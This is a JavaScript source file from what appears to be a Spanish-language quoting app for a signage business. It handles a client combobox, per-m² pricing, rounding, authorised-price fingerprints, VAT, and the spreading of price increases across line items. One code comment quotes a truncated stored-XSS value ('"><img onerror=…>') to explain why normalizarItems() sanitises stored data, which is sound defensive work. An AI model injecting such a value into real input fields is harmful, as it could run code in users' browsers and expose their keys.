    +'<b>'+(P&&P.resaltar?P.resaltar(g.nombre,q):esc(g.nombre))+'</b>'
    +(tel?'<span>'+esc(tel)+'</span>':'')
    +'<small>'+ult+'</small></div>';
}
function _comboPintarAct(desplazar){
  const inp=$('f-cli'), menu=$('cli-menu'), lista=$('cli-lista'); if(!inp||!menu||!lista) return;
  const pil=menu.querySelector('.combo-pil'), ops=lista.querySelectorAll('[role="option"]');
  ops.forEach((o,i)=>o.setAttribute('aria-selected',i===_comboAct?'true':'false'));
  if(_comboAct<0||!ops[_comboAct]){ if(pil) pil.style.opacity='0'; inp.removeAttribute('aria-activedescendant'); return; }
  const o=ops[_comboAct];
  if(pil){
    /* La primera vez, o con menos movimiento, el resalte aparece en su sitio; después se desliza. */
    const salto=pil.style.opacity!=='1'||(window.Piezas&&Piezas.sinMovimiento&&Piezas.sinMovimiento());
    if(salto) pil.style.transition='none';
    pil.style.transform='translateY('+o.offsetTop+'px)'; pil.style.height=o.offsetHeight+'px'; pil.style.opacity='1';
    if(salto){ void pil.offsetHeight; pil.style.transition=''; }
  }
  inp.setAttribute('aria-activedescendant',o.id);
  if(desplazar){
    /* A mano y no con scrollIntoView: éste desplaza también la página si la lista está a medias. */
    const arriba=o.offsetTop, abajo=arriba+o.offsetHeight;
    if(arriba<menu.scrollTop) menu.scrollTop=Math.max(0,arriba-4);
    else if(abajo>menu.scrollTop+menu.clientHeight-8) menu.scrollTop=abajo-menu.clientHeight+12;
  }
}
function _comboColocar(){
  const inp=$('f-cli'), menu=$('cli-menu'); if(!inp||!menu||!_comboAbierto()) return;
  const r=inp.getBoundingClientRect(), vv=window.visualViewport;
  const vTop=vv?vv.offsetTop:0, vAlto=vv?vv.height:innerHeight;
  /* Si el campo se fue —cambió de pantalla, o se desplazó fuera de la vista— la lista no se queda
     flotando donde ya no hay nada que completar. */
  if((!r.width&&!r.height)||r.bottom<vTop||r.top>vTop+vAlto){ _comboCerrar(); return; }
  const abajo=vTop+vAlto-r.bottom-10, arriba=r.top-vTop-10;
  menu.style.maxHeight='';
  const natural=Math.min(menu.scrollHeight+2,300);
  const haciaArriba=abajo<Math.min(natural,132)&&arriba>abajo;
  const hueco=Math.max(96,Math.min(300,haciaArriba?arriba:abajo));
  menu.style.maxHeight=hueco+'px';
  const ancho=Math.min(Math.max(r.width,300),innerWidth-16);
  menu.style.width=ancho+'px';
  menu.style.left=Math.max(8,Math.min(r.left,innerWidth-ancho-8))+'px';
  menu.style.top=Math.round(haciaArriba?r.top-menu.offsetHeight-6:r.bottom+6)+'px';
}
function _comboRepintarPos(e){
  if(e&&e.target&&e.target.id==='cli-menu') return;   // el desplazamiento de la propia lista no la mueve
  if(_comboRepos) return;
  _comboRepos=requestAnimationFrame(()=>{ _comboRepos=0; _comboColocar(); });
}
function _comboVigilar(on){
  const f=on?'addEventListener':'removeEventListener';
  window[f]('scroll',_comboRepintarPos,{capture:true,passive:true});
  window[f]('resize',_comboRepintarPos);
  if(window.visualViewport){ visualViewport[f]('resize',_comboRepintarPos); visualViewport[f]('scroll',_comboRepintarPos); }
}
function _comboAbrir(){
  const inp=$('f-cli'), menu=$('cli-menu'); if(!inp||!menu||_comboAbierto()) return;
  menu.dataset.abierto='1';
  if(menu.showPopover){ try{ menu.showPopover(); }catch(_){} } else menu.hidden=false;
  inp.setAttribute('aria-expanded','true');
  _comboVigilar(true);
}
function _comboCerrar(){
  const inp=$('f-cli'), menu=$('cli-menu'); if(!menu||!_comboAbierto()) return;
  delete menu.dataset.abierto;
  if(menu.hidePopover){ try{ menu.hidePopover(); }catch(_){} } else menu.hidden=true;
  if(inp){ inp.setAttribute('aria-expanded','false'); inp.removeAttribute('aria-activedescendant'); }
  _comboAct=-1; _comboVozN=-1; clearTimeout(_comboVozT);
  _comboVigilar(false);
}
/* Dice cuántos hay cuando la cuenta cambia, sin atropellar al que teclea: un cuarto de segundo
   después de la última tecla, y solo si el número es otro. */
function _comboDecir(){
  clearTimeout(_comboVozT);
  const n=_comboFilas.length;
  if(n===_comboVozN) return;
  _comboVozT=setTimeout(()=>{ _comboVozN=n; voz(n===1?'1 cliente con cuaderno':n+' clientes con cuaderno'); },450);
}
function _comboFiltrar(){
  const inp=$('f-cli'), lista=$('cli-lista'); if(!inp||!lista) return;
  const q=inp.value;
  _comboFilas=_comboFilasPara(q);
  if(!_comboFilas.length){ _comboCerrar(); return; }
  lista.innerHTML=_comboFilas.map((g,i)=>_comboFilaHTML(g,i,q)).join('');
  _comboAct=-1; _comboPintarAct(false);
  _comboAbrir(); _comboColocar(); _comboDecir();
}
function _comboElegir(g){
  const inp=$('f-cli');
  _comboCerrar();
  if(!g||!inp||locked()) return;
  inp.value=g.nombre;
  upd('cliente',g.nombre,g);
  try{ inp.focus({preventScroll:true}); }catch(_){}
}
function armarComboClientes(){
  const inp=$('f-cli'), menu=$('cli-menu'), lista=$('cli-lista');
  if(!inp||!menu||!lista||_comboArmado) return;
  _comboArmado=true;
  /* Sin popover (navegadores de antes de 2024) el elemento sería un bloque visible más: se esconde
     y se muestra a mano, con la misma posición fija. */
  if(!menu.showPopover) menu.hidden=true;
  inp.addEventListener('input',()=>{
    /* upd() corre antes que este oyente (es el oninput del marcado) y, si reconoció al cliente
       por su nombre completo, ya cerró la lista para que el lavado de los campos se vea. */
    if(_comboNoAbrir){ _comboNoAbrir=false; _comboCerrar(); return; }
    _comboFiltrar();
  });
  inp.addEventListener('click',()=>{ if(!_comboAbierto()) _comboFiltrar(); });
  inp.addEventListener('keydown',e=>{
    if(e.key==='ArrowDown'||e.key==='ArrowUp'){
      if(!_comboAbierto()) _comboFiltrar();
      if(!_comboFilas.length||!_comboAbierto()) return;
      e.preventDefault();
      const n=_comboFilas.length;
      _comboAct=e.key==='ArrowDown'?(_comboAct+1)%n:(_comboAct<=0?n-1:_comboAct-1);
      _comboPintarAct(true);
    } else if(e.key==='Enter'){
      if(_comboAbierto()&&_comboAct>=0){ e.preventDefault(); _comboElegir(_comboFilas[_comboAct]); }
    } else if(e.key==='Escape'){
      if(_comboAbierto()){ e.preventDefault(); e.stopPropagation(); _comboCerrar(); }
    }
  });
  /* El foco nunca sale del campo: apretar en la lista no se lo lleva (mousedown) ni la cierra
     (blur), pero DESLIZAR la lista con el dedo sigue funcionando. */
  inp.addEventListener('blur',()=>{ if(!_comboDentro) _comboCerrar(); });
  menu.addEventListener('pointerdown',e=>{ _comboDentro=true; e.preventDefault(); });
  menu.addEventListener('mousedown',e=>e.preventDefault());
  const suelta=()=>{ _comboDentro=false; };
  menu.addEventListener('pointerup',suelta); menu.addEventListener('pointercancel',suelta);
  window.addEventListener('blur',suelta);
  lista.addEventListener('pointermove',e=>{
    if(e.pointerType!=='mouse') return;   // con el dedo no hay «encima»: el resalte sale al tocar
    const o=e.target.closest('[role="option"]');
    if(o&&+o.dataset.i!==_comboAct){ _comboAct=+o.dataset.i; _comboPintarAct(false); }
  });
  lista.addEventListener('click',e=>{
    const o=e.target.closest('[role="option"]');
    suelta();
    if(o) _comboElegir(_comboFilas[+o.dataset.i]);
  });
}

/* ===================== Cálculo ===================== */
/* Todo lo que se cobra por m² (bastidor y caja de luz) comparte la misma regla:
   se cobra mínimo 1 m². Si el área es menor, se respeta el precio de un metro
   cuadrado completo; a partir de 1 m² se cobra tarifa × área real. */
const M2_MINIMO=1;
function m2Total(tarifa,m2){ return (tarifa||0)*Math.max(m2||0,M2_MINIMO); }
function m2EsMinimo(m2){ return (m2||0)>0 && (m2||0)<M2_MINIMO; }

/* ----- Cada partida cierra al centavo -----
   El importe de una partida salía con fracciones de centavo —bastidor de 100,5 × 102 cm a $950/m²
   son $973,845— y cada sitio lo redondeaba por su cuenta: el renglón del PDF con money(), el
   subtotal con toFixed sobre la suma sin redondear, el IVA por separado. Medido: el documento
   podía decir «Subtotal 4,873.85 + I.V.A. 779.82» y abajo «Total 5,653.66», que es la cuenta
   que un cliente con calculadora sí hace. Se redondea UNA vez, aquí, en la única fuente del
   importe de una partida; con las partidas en centavos exactos, la suma, el IVA y el total
   cuadran entre sí en pantalla, en el PDF y en el registro de venta. */
function lineTotal(it){ return Math.round(lineTotalCrudo(it)*100)/100; }
function lineTotalCrudo(it){
  if(it.tipo==='letras'){
    let p=factorOf(it)*(it.altura||0)*(it.n||0);
    if(!it.luz) p*=0.8;
    return p;
  }
  if(it.tipo==='recorte'){
    let rate=recOf(it.acab)?.precio||0;
    if(it.acab==='sandwich' && it.recComp) rate+=RECORTE_COMP_EXTRA;
    return rate*(it.altura||0)*(it.n||0);
  }
  if(it.tipo==='bastidor'){
    const m2=(it.ancho||0)*(it.alto||0)/10000;
    if(m2<=0) return 0;
    // Misma regla que la caja de luz: se cobra mínimo 1 m².
    return m2Total(basOf(it.bas)?.tarifa||0,m2);
  }
  if(it.tipo==='caja'){
    const m2=(it.ancho||0)*(it.alto||0)/10000;
    if(m2<=0) return 0;
    return m2Total(it.tarifa||0,m2);
  }
  return (it.pz||0)*(it.pu||0); // manual
}
function totals(){
  const sub=Q.items.reduce((s,it)=>s+lineTotal(it),0);
  const iva=Q.iva?sub*0.16:0;
  return {sub,iva,neto:sub+iva};
}

/* ----- ¿Sigue valiendo lo que autorizó una persona? -----
   Un precio autorizado no es un número suelto: es un número dicho SOBRE un trabajo
   concreto. Si el trabajo cambia, la autorización dejó de corresponder, y quien la dio
   no tiene por qué enterarse por el PDF.

   Antes esto se resolvía en la interfaz: soltar el precio vivía dentro de
   guardarCambiosEdicion, así que bastaba con no apretar ese botón —recargar la página,
   que iOS matara la pestaña— para que la cotización quedara autorizada en un precio de
   otras partidas. Y la condición era `Q.precioAuth>0`: cuando el autorizador aprobaba el
   precio calculado tal cual —el caso normal— editar las partidas no soltaba nada.

   Ahora se guarda la HUELLA del trabajo al momento de autorizar y son las funciones que
   responden «cuánto cuesta esto» las que se niegan a usar una autorización vencida. Así
   el número correcto no depende de que la pantalla se acuerde de preguntar. */
/* La huella describe el TRABAJO, no su importe: los campos de cada partida que mueven el
   precio, más el IVA. Basarla en lineTotal() sería más corto pero convertiría una edición
   del catálogo de precios —este archivo se edita a mano y se publica— en un cambio de
   trabajo, y soltaría autorizaciones que nadie había tocado. */
const _CAMPOS_PRECIO=['tipo','material','comp','luz','altura','n','acab','recComp','bas','ancho','alto','tarifa','pz','pu'];
/* La huella NO incluye cliente, teléfono ni proyecto, y es a propósito: son datos de a
   quién se le cotiza, no del trabajo cotizado. De ahí depende que escribir el teléfono
   que falta en una cotización vieja —para poder editar sus partidas— no le suelte su
   precio autorizado. Meterlos aquí «por consistencia» rompería justo eso, y es de las
   cosas que solo se descubren cuando ya rompieron una cotización que el cliente firmó. */
/* Y se ORDENAN antes de unirse, porque el orden de las partidas no es parte del trabajo.
   Sin el sort, la huella era la de la FILA: arrastrar una partida para que salga primera en
   el PDF —que no toca un solo campo de _CAMPOS_PRECIO— cambiaba la cadena, `authVigente()`
   pasaba a falso y `soltarAuthSiCambio()` tiraba el precio autorizado y TODOS los ajustes por
   partida. Medido sobre tres partidas con un descuento: $30,062.56 autorizados volvían a
   $34,162.00 calculados y el ajuste de $7,900 de una partida regresaba a $8,250, con el aviso
   de «cambiaron las partidas» acusando a un gesto que no cambió ninguna.

   Cada entrada empieza por `it.id+':'`, y los id son únicos, así que el orden resultante es
   estable y la huella queda siendo la del conjunto. Un cambio de verdad —otra medida, otro
   material, una partida más— la sigue moviendo igual. */
function huellaTrabajo(){
  return (Q.iva?'c':'s')+'|'+Q.items.map(it=>
    it.id+':'+_CAMPOS_PRECIO.map(k=>it[k]===undefined?'':String(it[k])).join('~')).sort().join(',');
}
/* ----- Qué botón abre el candado, según el estado -----
   Tres avisos —el ojo de una partida, deshacer y rehacer— decían siempre «La cotización está
   autorizada — usa «Editar partidas»», también en una PENDIENTE, donde ese botón no existe: ahí
   la salida es «Volver a editar», que cancela la solicitud. Un aviso que nombra un botón que no
   está manda a buscarlo. `para` es el final de la frase: «para poder deshacer». */
function msgCandadoCaptura(para){
  /* En rol Autorizador, con la solicitud abierta, su panel solo tiene «Autorizar precio» y
     «Rechazar»: nombrarle «Editar (cancela la solicitud)» era mandarlo a un botón que no ve. */
  if(Q.estado==='pendiente'&&Q.rol==='autorizador') return 'Estás revisando el precio: autorízala o recházala primero. Después, el vendedor puede editarla '+para;
  if(Q.estado==='pendiente') return 'La cotización está mandada a autorización — usa «'+
    (typeof _selfAuth!=='undefined'&&_selfAuth?'Volver a editar':'Editar (cancela la solicitud)')+'» '+para;
  if(Q.estado==='rechazada') return 'La cotización está rechazada — usa «Editar y volver a enviar» '+para;
  return 'La cotización está autorizada — usa «Editar partidas» '+para;
}
/* ----- Las partidas que llegan del almacenamiento -----
   Del teclado solo entran números —`+this.value`—, pero al3d_q, el historial y la cola también
   se llenan con un respaldo que llegó por WhatsApp, y de ahí puede venir cualquier cosa. Dos
   cosas pasaban con eso:
     · `altura`, `n`, `ancho`, `alto`, `tarifa`, `pz`, `pu` y el `id` se escriben crudos en
       value="…" y en los onclick de la partida: un respaldo con altura '"><img onerror=…>'
       corría su código en cada arranque, con las llaves de IA a la mano.
     · un `items:[null]` pasaba la validación de loadState() y reventaba renderItems() en
       init(): el cotizador quedaba roto en CADA recarga, sin nada que tocar para salir.
   Así que lo que entra desde el almacenamiento pasa por aquí: se va lo que no es una partida,
   los números se vuelven números (y lo que no sea uno, cero), el tipo desconocido cae en
   «manual» —que es como ya se pintaba— y el id se vuelve un entero único. */
const _NUM_PARTIDA=['altura','n','ancho','alto','tarifa','pz','pu'];
const _TIPOS_PARTIDA=['letras','recorte','bastidor','caja','manual'];
function normalizarItems(items){
  if(!Array.isArray(items)) return [];
  const out=[], usados=new Set();
  for(const it of items){
    if(!it||typeof it!=='object'||Array.isArray(it)) continue;
    const x=Object.assign({},it);
    for(const k of _NUM_PARTIDA) if(k in x){ const v=Number(x[k]); x[k]=isFinite(v)&&v>0?v:0; }
    if(!_TIPOS_PARTIDA.includes(x.tipo)) x.tipo='manual';
    const id=Number(x.id);
    x.id=(Number.isInteger(id)&&id>0&&!usados.has(id))?id:0;
    if(x.id) usados.add(x.id);
    out.push(x);
  }
  /* Los que no traían un id bueno —o repetido— se numeran después del mayor, para no chocar. */
  let tope=Math.max(0,...usados);
  for(const x of out) if(!x.id){ x.id=++tope; usados.add(x.id); }
  return out;
}
/* Sella el trabajo actual como el autorizado. Se llama donde se toma la decisión. */
function sellarAuth(){ Q.huellaAuth=huellaTrabajo(); }
/* ----- La huella que se guardó ANTES del orden -----
   Hasta el 15 de septiembre de 2026 la huella era la de la FILA, sin el sort de arriba, y esa
   es la que llevan guardada todas las cotizaciones autorizadas hasta entonces. Compararla tal
   cual con la de hoy fallaba en cuanto el orden de las filas no coincidía con el de las cadenas
   —con ids 9 y 10, que es lo normal porque `pid` no se reinicia entre cotizaciones, «10:» va
   antes que «9:»—: «Abrir y editar» soltaba en silencio el precio autorizado ($23,200 volvían
   a $25,520 calculados), borraba las palomitas del PDF y del WhatsApp y acusaba a «las
   partidas cambiaron». Ordenar las entradas de la huella guardada da exactamente la de hoy
   —son las mismas entradas, y ninguna lleva comas—, así que se compara siempre ordenada. */
function huellaOrdenada(h){
  const s=String(h||''), i=s.indexOf('|');
  return i<0?s:s.slice(0,i+1)+s.slice(i+1).split(',').sort().join(',');
}
/* ¿La autorización guardada corresponde a las partidas que hay ahora? */
function authVigente(){ return !!Q.huellaAuth && huellaOrdenada(Q.huellaAuth)===huellaTrabajo(); }
/* Suelta lo autorizado cuando ya no corresponde. Devuelve true solo si había algo que
   soltar, para que quien la llame lo diga en voz alta. Es el único lugar que lo suelta. */
/* «¿Hay algo puesto a mano por el autorizador?» — el total, o un ajuste partida por partida.
   Escrito una sola vez porque lo leen dos preguntas distintas, y ahí estaba el error: el aviso
   de entrar a modo edición miraba solo el total, así que la cotización cuyo autorizador ajustó
   partida por partida sin mover el total entraba a edición con el aviso suave y perdía todos
   esos ajustes al primer tecleo, avisada después. */
function hayAjusteAuth(){ return Q.precioAuth>0||Object.keys(Q.itemsAuth||{}).length>0; }
/* Lo que se perdería AHORA si se tocan las partidas: la autorización sigue valiendo y trae
   algo puesto. Lo lee el aviso de `toggleEditMode`, que avisa ANTES. */
function hayAuthQueSoltar(){ return authVigente()&&hayAjusteAuth(); }
function soltarAuthSiCambio(){
  if(!Q.huellaAuth || authVigente()) return false;
  /* Aquí `authVigente()` ya es false —por eso se está soltando—, así que la pregunta es la de
     dentro: si había algo que se está perdiendo, para poder decirlo. */
  const habia = hayAjusteAuth();
  /* El sello se va con la autorización: firmó OTRO trabajo, y un QR que dice «auténtica» sobre
     un PDF de partidas distintas sería el sello mintiendo. */
  Q.precioAuth=0; Q.itemsAuth={}; Q.huellaAuth=''; Q.sello=null;
  return habia;
}

/* ----- Precio final de la cotización -----
   Si el autorizador fijó un precio distinto al calculado, ESE es el que manda en
   todo: PDF, anticipo, registro de venta y textos copiados. Antes cada pantalla
   decidía por su cuenta y el registro de venta cobraba el precio sin descuento. */
function precioFinal(){
  const neto=totals().neto;
  /* Mientras no esté autorizada manda el calculado. Lo que el autorizador lleva teclado en
     el formulario de revisión es un borrador —updItemAuth escribe en Q con cada dígito— y
     se colaba al total de la barra de abajo y al del vendedor antes de que nadie aprobara
     nada. Un precio autorizado existe cuando alguien lo autorizó, no antes. */
  if(Q.estado!=='autorizada') return neto;
  if(!authVigente()) return neto;
  return (Q.precioAuth>0 && Math.abs(Q.precioAuth-neto)>0.01) ? Q.precioAuth : neto;
}
/* Subtotal y neto de los precios YA ajustados partida por partida. Es la base contra la
   que se mide el ajuste global, y la misma que suman los renglones del PDF. */
function subAjustado(){ return Q.items.reduce((s,it)=>s+itemPrecio(it),0); }
function netoAjustado(){ const sub=subAjustado(); return +((Q.iva?sub*1.16:sub)).toFixed(2); }
/* Ajuste del autorizador: positivo = descuento, negativo = aumento, 0 = sin ajuste.
   Se medía contra totals(), que ignora los ajustes por partida, mientras el PDF lo medía
   contra los precios ajustados: la pantalla anunciaba un «Ahorro» que el documento del
   cliente no mencionaba. Los descuentos por partida se ven en su propio renglón —con el
   calculado tachado—, así que aquí solo cuenta el ajuste que va encima de todos. */
function ajusteAuth(){ return +(netoAjustado()-precioFinal()).toFixed(2); }
/* ----- El precio se decide SIN IVA -----
   El I.V.A. no es dinero de la casa: es dinero que se cobra y se entrega. Un descuento
   tecleado sobre el neto rebaja de más —el 16 % que se iba a entregar de todos modos sigue
   saliendo del mismo bolsillo—, y quien lo teclea cree estar bajando el subtotal, que es lo
   único que de verdad se puede regalar. Por eso el formulario de revisión pide el SUBTOTAL y
   estos dos convierten en el borde: `Q.precioAuth` sigue guardándose en neto, que es lo que
   leen el historial, la cola, el PDF y el registro de venta desde que existen.

   Sin IVA las dos son la identidad, y eso importa: con el interruptor apagado el subtotal ES
   el total, y ninguna pantalla tiene que preguntar cuál de los dos está mirando. */
function conIva(sub){ return +((Q.iva?(sub||0)*1.16:(sub||0))).toFixed(2); }
function sinIva(neto){ return +((Q.iva?(neto||0)/1.16:(neto||0))).toFixed(2); }
/* Subtotal e IVA que corresponden al precio final (para el registro de venta). */
function desgloseFinal(){
  /* Los tres cierran entre sí: el I.V.A. sale de RESTAR el subtotal ya redondeado, no de
     redondear la diferencia sin redondear. Con la resta cruda los tres podían salir a un
     centavo de distancia —$17,585.60 + $2,813.69 contra un total de $20,399.30—, que es la
     cuenta que un cliente con calculadora sí hace, y la misma razón por la que lineTotal()
     redondea una sola vez. */
  const neto=+precioFinal().toFixed(2);
  const sub=+(Q.iva?neto/1.16:neto).toFixed(2);
  return {sub, iva:+(neto-sub).toFixed(2), neto};
}
/* Precio de una partida: el ajustado por el autorizador si lo hay, si no el calculado.
   El ajuste solo cuenta mientras la autorización siga correspondiendo a este trabajo:
   antes, un ajuste por partida sobrevivía a una edición posterior y el PDF cobraba el
   precio viejo de una partida que ya había cambiado de medida. */
function itemPrecio(it){
  if(Q.estado!=='autorizada' || !authVigente()) return lineTotal(it);
  const v=Q.itemsAuth&&Q.itemsAuth[it.id];
  return v!==undefined?v:lineTotal(it);
}
/* ----- El ajuste, dicho con su base -----
   El precio autorizado se mide contra DOS cosas distintas, y las dos son verdad: contra el
   subtotal calculado —lo que suman las partidas al catálogo— y contra las partidas ya
   ajustadas una por una, que es la base del reparto de preciosCliente(). Mientras no haya
   ajustes por partida las dos bases coinciden y da igual. Cuando los hay, no: medido con
   una partida bajada de $17,600 a $16,000 y un precio global de $30,000 sobre un calculado
   de $31,000, el formulario de revisión decía «Descuento: $1,000» —contra el calculado— y al
   autorizar la columna decía «Aumento: $600 · repartido entre las partidas» —contra las
   partidas ajustadas, $29,400—, con el subtotal pasando de $31,000 a $30,000 a la vista. Dos
   frases ciertas que juntas parecen un error.

   Aquí la frase se arma una sola vez y NOMBRA su base cuando hay dos: «Aumento: $600 sobre las
   partidas ya ajustadas ($29,400) · $1,000 por debajo del calculado ($31,000)». La leen el
   formulario de revisión, la columna del dinero, la nota de la cotización autorizada y el
   aviso de Registrar venta, para que ninguna diga una base distinta de las otras.

   `subFinal` es el subtotal que se va a cobrar; `subBase`, el de las partidas con sus ajustes
   individuales; `subCalc`, el calculado. Devuelve null cuando no hay ajuste global. */
function fraseAjuste(subFinal,subBase,subCalc){
  const base=+(subBase||0).toFixed(2), fin=+(subFinal||0).toFixed(2), calc=+(subCalc||0).toFixed(2);
  const d=+(base-fin).toFixed(2);          // >0 descuento · <0 aumento, sobre la base
  if(Math.abs(d)<0.01||!(base>0)) return null;
  const conPartidas=Math.abs(base-calc)>0.01;
  const dc=+(calc-fin).toFixed(2);         // lo mismo, contra el calculado
  const f={
    tipo:d>0?'Descuento':'Aumento', importe:Math.abs(d), pct:Math.round(Math.abs(d)/base*100),
    d, dc, base, calc, conPartidas,
    sobre:conPartidas?'sobre las partidas ya ajustadas ('+money(base)+')':'sobre el subtotal',
    vsCalc:!conPartidas?'':(Math.abs(dc)<0.01
      ?' · igual al calculado'
      :' · '+money(Math.abs(dc))+(dc>0?' por debajo':' por encima')+' del calculado ('+money(calc)+')'),
  };
  /* «Aumento: $600.00 (2%) sobre las partidas ya ajustadas ($29,400.00) · $1,000.00 por debajo
     del calculado ($31,000.00)». El porcentaje va pegado al importe y no detrás de la base,
     que ya trae su propio paréntesis. */
  f.linea=f.tipo+': '+money(f.importe)+' ('+f.pct+'%) '+f.sobre+f.vsCalc;
  return f;
}
/* Lo que suman las partidas con sus ajustes individuales puestos, valga o no la autorización
   todavía: es la base que el formulario de revisión ve mientras se teclea. Lo escribían por su
   cuenta updItemAuth y authRevisionHTML. */
function subConAjustesPorPartida(){
  const ia=Q.itemsAuth||{};
  return +Q.items.reduce((s,it)=>{ const v=ia[it.id]; return s+(v!==undefined?v:lineTotal(it)); },0).toFixed(2);
}

/* ----- Cuántas piezas lleva una partida -----
   Lo que imprime la columna «Pzas.» del PDF y lo que usa el reparto de abajo para sacar un
   unitario que multiplique limpio. Vivía duplicado en generarPDF y en copiarParaCanva. */
function piezasDe(it){
  if(it.tipo==='letras'||it.tipo==='recorte') return it.n||0;
  if(it.tipo==='bastidor'||it.tipo==='caja') return 1;
  return it.pz||1;
}

/* ----- Lo que ve el cliente cuando el autorizador SUBIÓ el precio -----
   Un descuento se imprime como renglón: «Descuento − $500» es un argumento de venta y el
   cliente lo agradece. Un aumento no. El PDF sacaba «Ajuste + $646.90» debajo del subtotal,
   y ese renglón es una invitación a preguntar por qué, con la tabla de arriba como prueba
   de que el precio «de verdad» era otro. El aumento es una decisión del autorizador sobre
   el trabajo completo —redondear a $7,200, cobrar la dificultad de una instalación— y el
   documento del cliente tiene que decir precios, no correcciones.

   Así que el aumento se REPARTE entre las partidas, en proporción a lo que cada una vale:
   la que es el 90 % del trabajo absorbe el 90 % del aumento. No se le carga todo a la más
   barata —pasaría de $560 a $1,200 y sería la primera que el cliente cuestione— ni a partes
   iguales, que a la más barata le pesa igual de raro. Las filas suman EXACTAMENTE el
   subtotal que corresponde al precio autorizado, así que el renglón «Ajuste» ya no existe:
   subtotal, I.V.A. y total, como en cualquier cotización.

   El reparto se hace sobre el PRECIO UNITARIO y en centavos enteros, no sobre el total de
   la partida, y eso es lo que evita el otro delator. La columna «Precio unitario» del PDF
   es el total entre las piezas: si al repartir queda un total que no divide —$625.17 entre
   2— el documento imprime «$312.59 *» y una nota al pie que dice que el unitario va
   prorrateado. Esa nota existe por una razón vieja y buena, pero aquí sería un letrero
   señalando justo lo que no se quiere señalar. Así que a cada partida se le da el unitario
   truncado al centavo y los centavos que faltan para cerrar se reparten DE UNO EN UNO sobre
   los unitarios —cada centavo de unitario cuesta tantos centavos de total como piezas
   tenga la partida—, empezando por las que quedaron más cerca del siguiente centavo. Así
   unitario × piezas da el total del renglón sin residuo y el asterisco no aparece.

   Los centavos que no caben en ningún unitario se cierran con un trueque entre dos partidas
   —abajo, con su ejemplo—. Lo que ni así cierra se le suma al total de la partida más cara, y
   ahí sí sale su asterisco: es la única marca que puede quedar, y no se puede quitar. Con una
   sola partida el subtotal tiene que ser múltiplo de sus piezas y no hay con quién truequear,
   así que sale marcada tres veces de cada cuatro; con dos partidas, una de cada dos; con
   cinco o más, casi nunca. Tres cosas no pueden ser verdad a la vez: que las filas sumen el
   subtotal, que el subtotal sea el que corresponde al precio autorizado, y que todos los
   unitarios multipliquen. La que cede es la tercera, porque es la única que el papel puede
   confesar sin mentir —para eso está el asterisco, que existía desde antes de este reparto—.
   Mover el subtotal unos centavos taparía la marca a cambio de un I.V.A. que no cuadra con
   su base, y un cliente con calculadora sí encuentra eso.

   Lo que se reparte es solo el aumento GLOBAL: el precio final que el autorizador puso por
   encima de lo que suman las partidas ya ajustadas una por una. Esos ajustes por partida
   son la base del reparto, no lo repartido. La pantalla del vendedor sigue diciendo
   «Aumento: $646.90»: quien vende sí tiene que saberlo; quien compra, no.

   Si ninguna partida vale nada —todas sin terminar— no hay proporción que guardar, así que
   no se reparte y el PDF vuelve al renglón de ajuste, que al menos suma. */
function hayAumentoAuth(){ return ajusteAuth()<-0.01 && subAjustado()>0.005; }
function preciosCliente(){
  const out={};
  Q.items.forEach(it=>{ out[it.id]=itemPrecio(it); });
  if(!hayAumentoAuth()) return out;
  const subBase=subAjustado(), subFinal=desgloseFinal().sub, factor=subFinal/subBase;
  /* Todo en centavos ENTEROS. El reparto tiene que cerrar exacto contra el subtotal, y en
     flotante «cerrar exacto» no existe: 0.1+0.2 no es 0.3 y una tabla de ocho renglones
     acaba a un centavo del total por aritmética, no por reparto. */
  const objetivo=Math.round(subFinal*100);
  const rep=[]; let suma=0;
  Q.items.forEach(it=>{
    const base=itemPrecio(it);
    /* Una partida en $0 —sin material, sin altura— se queda en $0: si recibiera su parte
       del aumento, el PDF llevaría un renglón con precio y sin trabajo descrito. */
    if(base<=0.005) return;
    const pz=Math.max(1,piezasDe(it));
    const exacto=base*factor*100/pz;      // el unitario que le toca, en centavos
    const u=Math.floor(exacto);
    rep.push({it,pz,u,frac:exacto-u,base});
    suma+=u*pz;
  });
  /* Lo que falta para cerrar, por haber truncado todos los unitarios. Siempre es positivo y
     siempre menos de un centavo por pieza de toda la cotización. */
  let resto=objetivo-suma;
  /* Quien quedó más cerca del siguiente centavo cobra primero, que es lo que mantiene el
     reparto proporcional. Se dan varias pasadas porque un centavo de unitario cuesta tantos
     centavos como piezas tenga la partida: al final quedan las de pocas piezas, que son las
     que caben en lo poco que sobra. */
  rep.sort((a,b)=>b.frac-a.frac||b.base-a.base);
  let cupo=true;
  while(resto>0&&cupo){
    cupo=false;
    for(const r of rep){
      if(r.pz>resto) continue;
      r.u++; resto-=r.pz; cupo=true;
      if(!resto) break;
    }
  }
  /* Lo que sobra después de eso son menos centavos que piezas tiene la partida más chica, y
     por eso ya no cabe en ningún unitario. Pero casi siempre cabe si a otra partida se le
     QUITA un centavo de unitario: dos partidas de 2 y 3 piezas con un centavo suelto no
     pueden repartirlo, y en cambio quitar un centavo a la de 3 (−$0.03) y dar dos a la de 2
     (+$0.04) cierra el centavo exacto. Se buscan las dos partidas más caras que lo permitan:
     el trueque mueve unos pocos centavos y donde menos pesan es en los renglones grandes.
     Con esto cierran limpias 4 de cada 5 cotizaciones en vez de la mitad; de las que no,
     casi todas son de una sola partida, donde no hay pareja y el subtotal simplemente no es
     divisible entre las piezas: eso ya pasaba antes de este reparto y para eso está el
     asterisco. */
  if(resto>0&&rep.length>1){
    const porPrecio=rep.slice().sort((a,b)=>b.base-a.base);
    buscar:
    for(const quita of porPrecio){
      if(quita.u<1) continue;   // no se le puede bajar el unitario a quien está en un centavo
      for(const pone of porPrecio){
        if(pone===quita) continue;
        const falta=resto+quita.pz;
        if(falta%pone.pz) continue;
        quita.u--; pone.u+=falta/pone.pz; resto=0;
        break buscar;
      }
    }
  }
  rep.forEach(r=>{ out[r.it.id]=+(r.u*r.pz/100).toFixed(2); });
  /* Y si ni con eso —una sola partida, o piezas que no dan— los centavos van al total de la
     más cara. Es el único renglón que puede salir con asterisco, y es el que menos lo canta.
     `resto` no puede ser negativo —los unitarios se truncan, así que el reparto siempre queda
     corto—, y aun así se cierra por los dos lados: lo que no puede pasar es que las filas del
     PDF no sumen el subtotal, y esa es la única línea que lo garantiza. */
  if(resto!==0&&rep.length){
    const dest=rep.reduce((a,b)=>b.base>a.base?b:a);
    out[dest.it.id]=+(out[dest.it.id]+resto/100).toFixed(2);
  }
  return out;
}
/* El precio de una partida tal como lo ve el cliente: el ajustado por el autorizador y,
   si además subió el total, con su parte de ese aumento. Es el que imprimen el PDF y el
   texto de Canva, y por eso también el que enseña la pantalla (ltHTML). */
function itemPrecioCliente(it){ const p=preciosCliente()[it.id]; return p===undefined?itemPrecio(it):p; }

